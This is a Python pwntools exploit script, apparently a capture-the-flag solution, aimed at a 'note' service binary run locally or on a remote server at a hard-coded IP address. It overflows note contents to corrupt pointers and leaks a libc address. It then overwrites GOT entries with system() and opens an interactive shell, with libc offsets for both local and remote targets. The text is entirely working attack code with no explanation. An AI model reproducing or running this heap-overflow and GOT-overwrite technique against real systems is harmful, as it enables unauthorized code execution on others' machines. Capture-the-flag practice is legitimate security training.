from pwn import *

def new_note(title, content):
	print p.recvuntil('option--->>')
	p.sendline('1')
	print p.recvuntil('title:')
	p.sendline(title)
	print p.recvuntil('type:')
	p.sendline('1')
	print p.recvuntil('content:')
	p.sendline(content)

def edit_note(title,content):
	print p.recvuntil('option--->>')
	p.sendline('3')
	print p.recvuntil('title:')
	p.sendline(title)
	print p.recvuntil('content:')
	p.sendline(content)

def delete_note(title):
	print p.recvuntil('option--->>')
	p.sendline('4')
	print p.recvuntil('title:')
	p.sendline(title)

def show_note():
	print p.recvuntil('option--->>')
	p.sendline('2')
if sys.argv[1] == '1':
	p = process('./note')
else:
	p = remote('115.28.27.103',9001)

new_note('0', 'a'*100)		#first
new_note('1', 'a'*100)		#second
new_note('2', 'a'*100)		#third
new_note('3', 'a'*100)		#third
new_note('4', 'a'*100)		#third
new_note('5', 'a'*100)		#third
new_note('6', 'a'*100)		#third
new_note('7', 'a'*100)		#third

ptr=0x602018
payload0  = 'b'*256
payload0 += p64(0)
payload0 += p64(0)
payload0 += p64(0)
payload0 += p64(ptr - 0x78)
payload0 += '1'


edit_note('0', payload0)		#over flow second
show_note()
for i in range(8):
	data = p.recvuntil('content=')
data = p.recvuntil('New')
print 'rawdata----------------------'
print data
print 'hex----------------------'
print data.encode('hex')
magic = u64(data[:6].ljust(8, '\x00'))
print 'magic: ', hex(magic)

#--------------------------------------------------------------------- leak libc
ptr=0x602028
payload0  = 'b'*256
payload0 += p64(0)
payload0 += p64(0)
payload0 += p64(0)
payload0 += p64(ptr - 0x40)


edit_note('1', payload0)		#over flow second

show_note()

for i in range(7):
	data = p.recvuntil('content=')
data = p.recvuntil('New')
print 'rawdata----------------------'
print data
print 'hex----------------------'
print data.encode('hex')
malloc_r = u64(data[:6].ljust(8, '\x00'))
print 'leak: ', hex(malloc_r)
if sys.argv[1] == '1':
	base = malloc_r - 0x7b380    			#local
else:
	base = malloc_r - 0x82750 			#remote
print '\066[1;31;40m'
print 'base: ', hex(base)


#----------------------------------end leak
ptr = 0x602048 - 112
payload  = ''
payload += 'a'*0x100
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(ptr)
payload += '7'
edit_note('6', payload)

if sys.argv[1] == '1':
	#local
	strcmp_l = base + 0x7f650
	gmon_l = base + 0
	malloc_l = base + 0x7b380
	setvbuf_l = base
	system_l = base + 0x3f890
	payload  = ''
	payload += p64(strcmp_l)
	payload += p64(gmon_l)
	payload += p64(malloc_l)
	payload += p64(setvbuf_l)
	payload += p64(system_l)


else: 
	#remote
	strcmp_l = base + 0x87070
	gmon_l = base + 0
	malloc_l = base + 0x82750
	setvbuf_l = base
	system_l = base + 0x46640
	payload  = ''
	payload += p64(strcmp_l)
	payload += p64(gmon_l)
	payload += p64(malloc_l)
	payload += p64(setvbuf_l)
	payload += p64(system_l)





edit_note('', payload)

p.interactive()
